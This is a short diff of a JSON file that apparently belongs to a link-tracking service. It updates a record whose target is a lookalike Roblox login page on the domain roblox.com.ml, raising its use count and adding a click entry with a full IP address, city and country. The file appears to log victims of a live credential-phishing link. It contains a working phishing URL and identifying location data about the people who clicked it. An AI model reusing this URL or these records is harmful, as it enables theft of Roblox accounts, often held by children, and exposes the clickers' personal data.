@@ -110,7 +110,7 @@
     "targetUrl": "https://www.roblox.com.ml/NewLogin?returnUrl=https%3A%2F%2Fwww.roblox.com%2Fcommunities%2F296844474575%2FKeyPermanent",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 711,
+    "useCount": 712,
     "createdBy": "admin",
     "clicks": [
       {
@@ -5800,6 +5800,14 @@
         "city": "Naarn im Machlande",
         "flag": "🇦🇹",
         "countryCode": "AT"
+      },
+      {
+        "timestamp": 1777137039180,
+        "ip": "213.233.108.218",
+        "country": "Romania",
+        "city": "Bucharest",
+        "flag": "🇷🇴",
+        "countryCode": "RO"
       }
     ]
   },
